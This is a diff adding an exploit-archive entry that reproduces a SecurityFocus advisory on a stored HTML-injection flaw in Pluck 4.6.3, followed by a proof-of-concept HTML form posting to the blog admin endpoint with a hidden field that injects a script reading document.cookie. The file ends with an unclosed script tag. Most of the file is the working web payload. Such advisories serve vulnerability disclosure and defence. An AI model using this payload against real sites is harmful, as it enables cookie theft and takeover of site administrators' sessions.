@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/43597/info
+
+Pluck is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Pluck 4.6.3 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/admin.php?module=blog&page=newpost" method="post" name="main" >
+
+<input type="hidden" name="cont1" value=&#039;1"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="cont2" value="no category" />
+<input type="hidden" name="cont3" value="" />
+<input type="submit" id="btn" name="Submit" value="Save" />
+
+</form>
+<script>
